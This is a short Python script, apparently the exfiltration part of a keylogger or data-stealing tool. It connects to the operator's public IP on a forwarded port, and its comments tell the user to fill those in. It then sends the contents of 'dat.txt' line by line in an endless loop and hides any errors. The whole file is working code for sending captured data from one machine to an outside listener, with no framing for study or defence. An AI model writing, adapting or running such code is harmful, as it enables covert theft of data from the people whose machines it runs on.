import socket
try:
	rhost = '192.168.0.100' # Your PUBLIC IP
	rport = 5733 # Your Forwarded port
	key = socket.socket()
	key.connect((rhost, rport))
	while True:
		with open("dat.txt", 'r') as file:
			for lines in file:
				word = lines.strip()
				print(word)
				key.send(word.encode())
except Exception as e:
	print(e)
	pass 